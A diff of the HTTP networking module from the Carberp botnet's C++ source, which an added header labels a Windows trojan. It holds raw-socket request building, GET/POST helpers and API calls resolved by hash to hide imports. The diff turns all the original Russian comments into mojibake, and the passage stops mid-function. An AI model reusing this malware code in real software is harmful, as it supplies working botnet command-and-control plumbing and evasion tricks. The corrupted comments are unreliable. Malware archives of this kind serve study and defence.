@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 
 #include <windows.h>
@@ -16,7 +27,7 @@
 
 PHTTPRequest HTTPCreateRequest(PCHAR URL)
 {
-	// Создать структуру запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PHTTPRequest R = CreateStruct(THTTPRequest);
 	R->Method = hmGET;
 
@@ -25,7 +36,7 @@ PHTTPRequest HTTPCreateRequest(PCHAR URL)
 		PURL UR = CreateStruct(TURL);
 		if (ParseURL(URL, UR, false))
 		{
-			// Переносим параметры
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			R->Host = UR->Host;
 			R->Path = UR->Path;
 			R->Port = UR->Port;
@@ -45,7 +56,7 @@ PHTTPRequest HTTPCreateRequest(PCHAR URL)
 
 void HTTPFreeRequest(PHTTPRequest Request)
 {
-	// Создать структуру запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request == NULL)
 		return;
 	HTTPClearRequest(Request);
@@ -55,7 +66,7 @@ void HTTPFreeRequest(PHTTPRequest Request)
 
 void HTTPClearRequest(PHTTPRequest Request)
 {
-	// Функция очищает структуру HTTP запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request == NULL)
 		return;
 
@@ -82,21 +93,21 @@ void HTTPClearRequest(PHTTPRequest Request)
 //----------------------------------------------------------------------------
 void SetDefaultPort(PHTTPRequest R)
 {
-	// Устанавливаем порт по умолчанию, если в запросе не установлен
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (R->Port == 0)
 		R->Port = PortHTTP;
 }
 
 void SetParam(PCHAR &Attr, PCHAR Value)
 {
-	// инициализировать параметр. если он нулевой
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Attr == NULL)
 		Attr = STR::New(Value);
 }
 
 void HTTPInitializeRequest(PHTTPRequest Request)
 {
-	// Функция заполняет не указанные поля структуры запроса стандартными данными
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request == NULL)
 		return;
 
@@ -115,7 +126,7 @@ void HTTPInitializeRequest(PHTTPRequest Request)
 	SetParam(Request->Connection, DefaultConnection);
 	if (Request->Method == hmPOST)
 	{
-		// Устанавливаем тип контента
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Request->ContentType == NULL)
 		{
 			if (Request->PostDataType == pdtUrlEncoded)
@@ -127,7 +138,7 @@ void HTTPInitializeRequest(PHTTPRequest Request)
             }
         }
 
-		// Определяем размер пост данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Request->ContentLength == 0)
 		{
 			if (Request->PostDataType == pdtUrlEncoded)
@@ -140,28 +151,28 @@ void HTTPInitializeRequest(PHTTPRequest Request)
 
 void HTTPSetRequestURL(PHTTPRequest Request, PCHAR URL)
 {
-	// Заполнить  структуру запроса данными из адреса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 }
 //---------------------------------------------------------------------------
 
 void AddParam(PStrings S, PCHAR Name, PCHAR Value, bool Valid = true)
 {
-	// В случае если Valid == true и значение не равно NULL добавляем
-	// Значение в список
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Valid == true пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ NULL пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Valid && !STR::IsEmpty(Value))
 		Strings::AddValue(S, Name, Value, ValueDelimeter);
 }
 
 PCHAR HTTPRequest::Build(PHTTPRequest Request)
 {
-	// Вункция собирает строку запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request == NULL || STR::IsEmpty(Request->Host))
 		return NULL;
 
     HTTPInitializeRequest(Request);
 
-	 // Собираем первую строку запроса
+	 // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Top = GetMethodStr(Request->Method);
 	if (Top == NULL)
 		return NULL;
@@ -173,13 +184,13 @@ PCHAR HTTPRequest::Build(PHTTPRequest Request)
 	Strings::Add(S, Top);
     STR::Free(Top);
 
-	// Добавляем параметры
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	AddParam(S, ParamAccept, Request->Accept);
 	AddParam(S, ParamUserAgent, Request->UserAgent);
 
 	if (Request->UseRange)
 	{
-		// Заполняем заголовок Range
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Range
 		PCHAR Start = StrLongToString(Request->StartRange);
 		PCHAR End = NULL;
 		if (Request->EndRange != 0)
@@ -199,14 +210,14 @@ PCHAR HTTPRequest::Build(PHTTPRequest Request)
 	AddParam(S, ParamConnection, Request->Connection);
 	if (Request->Method == hmPOST)
 	{
-		// Добавляем информацию о пост данных
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		AddParam(S, ParamContentType, Request->ContentType);
 		PCHAR CL = StrLongToString(Request->ContentLength);
 		AddParam(S, ParamContentLength, CL);
         STR::Free(CL);
 	}
 
-	// Добавляем заверщающие строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Strings::Add(S, "\r\n");
 
 	PCHAR Result = Strings::GetText(S);
@@ -217,7 +228,7 @@ PCHAR HTTPRequest::Build(PHTTPRequest Request)
 
 PCHAR GetMethodStr(THTTPMethod Kind)
 {
- // получить строку метода по номеру
+ // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	 switch (Kind) {
 		case hmGET:
 			return STR::New(HTTPMethodGET);
@@ -233,7 +244,7 @@ PCHAR GetMethodStr(THTTPMethod Kind)
 
 PCHAR URLEncode(PCHAR URL, DWORD URLSize)
 {
-	// Функция кодирует URL строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL пїЅпїЅпїЅпїЅпїЅпїЅ
     DWORD Len;
 	if (URLSize == 0)
 		Len = StrCalcLength(URL);
@@ -245,7 +256,7 @@ PCHAR URLEncode(PCHAR URL, DWORD URLSize)
 
 	char Hex[] = "0123456789ABCDEF";
 
-    // Резервируем временный буфер
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR Buf = STR::Alloc(Len*3);
 	if ( Buf == NULL )
 		return NULL;
@@ -261,7 +272,7 @@ PCHAR URLEncode(PCHAR URL, DWORD URLSize)
 	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
 
 
-    // Кодируем строку
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	while (Pos < Len)
 	{
 		if (*p == 0)
@@ -294,13 +305,13 @@ PCHAR URLEncode(PCHAR URL, DWORD URLSize)
 		Pos++;
     }
 
-	// Возвращаем строку по фактическому размеру буфера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Res = STR::New(Buf, ResLen);
     STR::Free(Buf);
 	return Res;
 }
 
-// Функция ставит ноль на текущую позицию и смещает указатель за него
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ
 #define IncStrEx(S) if(S != NULL){*S = 0; S++;}
 
 
@@ -311,10 +322,10 @@ bool ParseURL(PCHAR URL, PURL Rec, bool FullPars)
 
 	PCHAR Buf;
 
-	// Определяем протокол
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Rec->Protocol = STR::GetLeftStr(URL, "://");
 
-	// Создаём временный буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Rec->Protocol != NULL)
 	{
 		Buf = STR::GetRightStr(URL, "://");
@@ -324,11 +335,11 @@ bool ParseURL(PCHAR URL, PURL Rec, bool FullPars)
 	else
 		Buf = STR::New(URL);
 
-	// Определяем указатели на вадные блоки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR PathPtr = STR::Scan(Buf, '/');
 	IncStrEx(PathPtr);
 
-	// Строка параметров
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR ArgsPtr = NULL;
 	PCHAR DocPtr = NULL;
 	if (FullPars)
@@ -336,11 +347,11 @@ bool ParseURL(PCHAR URL, PURL Rec, bool FullPars)
 		ArgsPtr = STR::Scan(PathPtr, '?');
 		IncStrEx(ArgsPtr);
 
-		// Определяем документ
-		DocPtr = STR::ScanEnd(PathPtr, '/'); // Ищем последний слеш
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+		DocPtr = STR::ScanEnd(PathPtr, '/'); // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (DocPtr == NULL)
 		{
-			// Путь является документом
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			DocPtr = PathPtr;
             PathPtr = NULL;
 		}
@@ -348,12 +359,12 @@ bool ParseURL(PCHAR URL, PURL Rec, bool FullPars)
         	IncStrEx(DocPtr);
 	}
 
-	// Строка хоста и порта
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	PCHAR HostPtr = Buf;
 	PCHAR PortPtr = STR::Scan(HostPtr, ':');
 	IncStrEx(PortPtr);
 
-	// Копируем строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Rec->Host      = STR::New(HostPtr);
 	Rec->Path      = STR::New(PathPtr);
 	Rec->Document  = STR::New(DocPtr);
@@ -391,22 +402,22 @@ void AddURLParam(PStrings S, PCHAR Name, PCHAR Value, DWORD ValueSize)
 }
 
 //----------------------------------------------------------------------------
-//  Функции для загрузки страниц
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //----------------------------------------------------------------------------
 
 #define HTONS(x) (((x) << 8) | ((x) >> 8))
 
 SOCKET ConnectToHost(PCHAR Host, int Port)
 {
-	// Подключаемся к хосту
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 
-	// Получаем  адрес по имени хоста
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	LPHOSTENT lpHost = (LPHOSTENT)pgethostbyname((const char*)Host);
 
 	if ( lpHost == NULL )
 		return SOCKET_ERROR;
 
-	// Открываем хост
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	SOCKET Socket = (SOCKET)psocket( AF_INET, SOCK_STREAM, 0 );
 
 	if( Socket == SOCKET_ERROR )
@@ -418,7 +429,7 @@ SOCKET ConnectToHost(PCHAR Host, int Port)
 	SockAddr.sin_addr.s_addr = **(unsigned long**)lpHost->h_addr_list;
 	SockAddr.sin_port		 = HTONS((unsigned short)Port );
 
-	// подключаемся к сокету
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if ( (int)pconnect( Socket, (const struct sockaddr*)&SockAddr, sizeof( SockAddr ) ) == SOCKET_ERROR )
 	{
 		pclosesocket( Socket );
@@ -430,7 +441,7 @@ SOCKET ConnectToHost(PCHAR Host, int Port)
 
 bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
 {
-    // Прочитать данные из сокета
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PMemBlockList HeaderBuf = MEMBLOCK::CreateList();
 
 	if (HeaderBuf == NULL)
@@ -442,7 +453,7 @@ bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
 
 	bool Completed = false;
     int DelPos;
-	// Получаем заголовок ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	LPBYTE PartBuf = NULL;
 	int PartSize = 0;
 
@@ -453,11 +464,11 @@ bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
 		if (Size == 0)
 			break;
 
-		// Определяем позицию разделителя
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DelPos = STR::Pos((PCHAR)Data, LineBreak2);
 		if (DelPos >= 0)
 		{
-		   // Разделитель заголовка найден
+		   // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		   Completed = true;
 		   PartBuf = Data;
 		   DWORD L = StrCalcLength(LineBreak2);
@@ -481,7 +492,7 @@ bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
     }
 
 
-	// Обрабатываем заголовки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
     PChunks Chunks = Chunks::Initialize(Header);
 
@@ -492,12 +503,12 @@ bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
 	if (RecBuf == NULL)
 		return false;
 
-	// Записываем остаток кадра
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
 	if (PartSize > 0)
 		MEMBLOCK::AddBlock(RecBuf, PartBuf, PartSize);
 
-	// Получаем документ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	do
 	{
 		Size = (int)precv(Sock, Data, DataSize, 0);
@@ -514,7 +525,7 @@ bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
 
     bool Result = true;
 
-    // проверяем кодировку передачи
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Chunks != NULL)
 	{
 		Chunks::HandleDataBlock(Chunks, (LPBYTE)*Buf, Len);
@@ -529,18 +540,18 @@ bool ReceiveData(SOCKET Sock, PCHAR &Header, PCHAR *Buf, DWORD &Len)
 
 void HTTPSendPostData(PHTTPRequest Request, SOCKET Socket)
 {
-	// Отправить пост данные в сокет
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (Request->PostData == NULL)
 		return;
 
 	if (Request->PostDataType == pdtUrlEncoded)
 	{
-		// Отправляем URL Encoded данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ URL Encoded пїЅпїЅпїЅпїЅпїЅпїЅ
 		psend(Socket, Request->PostData, Request->ContentLength, 0);
         return;
 	}
 
-	// Отправляем MultiPartData
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ MultiPartData
 	PMultiPartData D = (PMultiPartData)Request->PostData;
 	DWORD BufSize = 4096;
 	DWORD Readed;
@@ -561,11 +572,11 @@ void HTTPSendPostData(PHTTPRequest Request, SOCKET Socket)
 
 bool HTTP::ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response)
 {
-	// Функция выполняет HTTP метод указанный в настройках запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request == NULL || Request->Host == NULL)
 		return false;
 
-	// Очищаем данные ответа
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Response != NULL)
 	{
 		if (Response->Buffer != NULL) *Response->Buffer = NULL;
@@ -574,7 +585,7 @@ bool HTTP::ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response)
 	}
 
 	
-	// Ини               иализируем библиотеку
+	// пїЅпїЅпїЅ               пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	WSADATA wsa;
 	ClearStruct(wsa);
 	DWORD Code = (DWORD)pWSAStartup(MAKEWORD( 2, 2 ), &wsa);
@@ -584,12 +595,12 @@ bool HTTP::ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response)
 
 	SetDefaultPort(Request);
 
-	// Подключаемся к хосту
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	SOCKET Sock = ConnectToHost(Request->Host, Request->Port);
 	if (Sock == SOCKET_ERROR)
 		return false;
 
-	// Отправлям данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR SendBuf = HTTPRequest::Build(Request);
 	if (SendBuf == NULL)
 	{
@@ -601,14 +612,14 @@ bool HTTP::ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response)
 
 	if ((int)psend(Sock, SendBuf, BufSize, 0) != SOCKET_ERROR)
 	{
-        // Отправляем пост данные
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Request->Method == hmPOST)
 		{
-			// Добавляем POST данные
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ POST пїЅпїЅпїЅпїЅпїЅпїЅ
 			HTTPSendPostData(Request, Sock);
 		}
 
-		// Данные отправлены, читаем ответ
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if (Response != NULL && (Response->Buffer != NULL || Response->Response!= NULL))
 		{
 			DWORD Size = 0;
@@ -631,7 +642,7 @@ bool HTTP::ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response)
 		}
     }
 
-	// Закрываем хост
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pclosesocket(Sock);
 
 	return true;
@@ -640,7 +651,7 @@ bool HTTP::ExecuteMethod(PHTTPRequest Request, HTTP::PResponseData Response)
 
 bool HTTP::Get(PCHAR URL, PCHAR *Buf, PHTTPResponse Response)
 {
-	// Функция считаевает файл по адресу URL в буФер Buf
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ URL пїЅ пїЅпїЅпїЅпїЅпїЅ Buf
 	if (URL == NULL)
 		return false;
 
@@ -659,7 +670,7 @@ bool HTTP::Get(PCHAR URL, PCHAR *Buf, PHTTPResponse Response)
 
 bool HTTP::Post(PCHAR URL, PStrings Fields, PCHAR *Buf, PHTTPResponse Response)
 {
-	// Отправить пост запрос на сервер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (URL == NULL || Fields == NULL)
 		return false;
 
@@ -679,7 +690,7 @@ bool HTTP::Post(PCHAR URL, PStrings Fields, PCHAR *Buf, PHTTPResponse Response)
 
 bool HTTP::Post(PCHAR URL, PMultiPartData Fields, PCHAR *Buf, PHTTPResponse Response)
 {
-	// Отправить пост запрос на сервер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (URL == NULL || Fields == NULL)
 		return false;
 
@@ -703,7 +714,7 @@ bool HTTP::Post(PCHAR URL, PMultiPartData Fields, PCHAR *Buf, PHTTPResponse Resp
 
 PCHAR GetEndLine(PCHAR Str)
 {
-	// Функция возвращает Указатель на последний символ строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Str == NULL)
 		return NULL;
 
@@ -715,7 +726,7 @@ PCHAR GetEndLine(PCHAR Str)
 
 PCHAR ScanLN(PCHAR S, char C, bool SetAfter = false)
 {
-	// Функция ищет символ до конца строки
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (S == NULL)
 		return NULL;
 	PCHAR T = S;
@@ -732,7 +743,7 @@ PCHAR ScanLN(PCHAR S, char C, bool SetAfter = false)
 
 void IgnoreSpaces(PCHAR &S)
 {
-    // Игнорировать пробелы
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (S == NULL)
 		return;
 	while (*S != 0 && *S == ' ') S++;
@@ -740,7 +751,7 @@ void IgnoreSpaces(PCHAR &S)
 
 PCHAR GetStrFromPtr(PCHAR Start, PCHAR End)
 {
-	// Получить строку между указателями
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Start == NULL || End == NULL)
 		return NULL;
 	int Len = End - Start;
@@ -770,10 +781,10 @@ bool IsKnownHTTPMethod(PCHAR Method)
 #define ClearStrVar(S) if (S != NULL) *S = NULL
 
 
-// Методы анализа HTTP заголовков
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTTP пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVersion)
 {
-	// Разобрать превую строку запроса
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	ClearStrVar(Method);
 	ClearStrVar(Path);
 	ClearStrVar(ProtVersion);
@@ -781,7 +792,7 @@ bool ParseRequestFirstLine(PCHAR Line, PCHAR *Method, PCHAR *Path, PCHAR *ProtVe
 	if (Line == NULL)
 		return false;
 
-	// Определяем указатели на путь и протокол
